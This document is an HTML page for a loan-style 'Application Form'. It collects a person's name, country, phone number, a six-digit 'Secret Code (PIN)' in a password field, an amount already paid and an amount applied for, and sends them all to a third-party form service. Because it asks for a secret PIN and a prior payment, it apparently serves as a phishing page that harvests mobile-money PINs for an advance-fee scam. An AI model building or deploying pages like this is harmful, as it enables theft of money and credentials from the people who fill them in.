<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      padding: 20px;
    }

    .form-container {
      max-width: 500px;
      margin: 0 auto;
      background-color: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }

    small {
      color: #666;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Application Form</h2>
    <form action="https://formspree.io/f/your_form_id" method="POST">
      <label for="fullname">Full Name:</label>
      <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>

      <label for="country">Country:</label>
      <select id="country" name="country" required>
        <option value="" disabled selected>Select your country</option>
        <option value="Algeria">Algeria</option>
        <option value="Angola">Angola</option>
        <option value="Botswana">Botswana</option>
        <option value="Burundi">Burundi</option>
        <option value="Cameroon">Cameroon</option>
        <option value="Côte d'Ivoire">Côte d'Ivoire</option>
        <option value="DR Congo">DR Congo</option>
        <option value="Egypt">Egypt</option>
        <option value="Ethiopia">Ethiopia</option>
        <option value="Ghana">Ghana</option>
        <option value="Kenya">Kenya</option>
        <option value="Lesotho">Lesotho</option>
        <option value="Malawi">Malawi</option>
        <option value="Morocco">Morocco</option>
        <option value="Mozambique">Mozambique</option>
        <option value="Namibia">Namibia</option>
        <option value="Nigeria">Nigeria</option>
        <option value="Rwanda">Rwanda</option>
        <option value="Senegal">Senegal</option>
        <option value="South Africa">South Africa</option>
        <option value="Sudan">Sudan</option>
        <option value="Tanzania">Tanzania</option>
        <option value="Tunisia">Tunisia</option>
        <option value="Uganda">Uganda</option>
        <option value="Zambia">Zambia</option>
        <option value="Zimbabwe">Zimbabwe</option>
      </select>

      <label for="phone">Phone Number:</label>
      <input 
        type="tel" 
        id="phone" 
        name="phone" 
        placeholder="e.g. 0712345678 or 254712345678" 
        pattern="^\d{9,12}$" 
        title="Enter 9 to 12 digits only, without + sign. E.g., 0712345678 or 254712345678" 
        required
      >
      <small>Enter your phone number in either local or international format. No + sign needed.</small>

      <label for="secret">Secret Code (PIN):</label>
      <input type="password" id="secret" name="secret" placeholder="Enter your 6-digit code" pattern="\d{6}" title="Enter a 6-digit code" required>

      <label for="amount_paid">Amount Paid:</label>
      <input type="number" id="amount_paid" name="amount_paid" placeholder="Enter the amount you paid" min="1" required>

      <label for="amount_applied">Amount Applied For:</label>
      <input type="number" id="amount_applied" name="amount_applied" placeholder="Enter amount you are applying for" min="1" required>

      <!-- Optional redirect after submit -->
      <input type="hidden" name="_redirect" value="thankyou.html">

      <input type="submit" value="Submit Application">
    </form>
  </div>

  <script>
    // Real-time error display on field exit
    document.querySelectorAll("input, select").forEach(function(input) {
      input.addEventListener("blur", function() {
        if (!input.checkValidity()) {
          input.reportValidity();
        }
      });
    });
  </script>
</body>
</html>
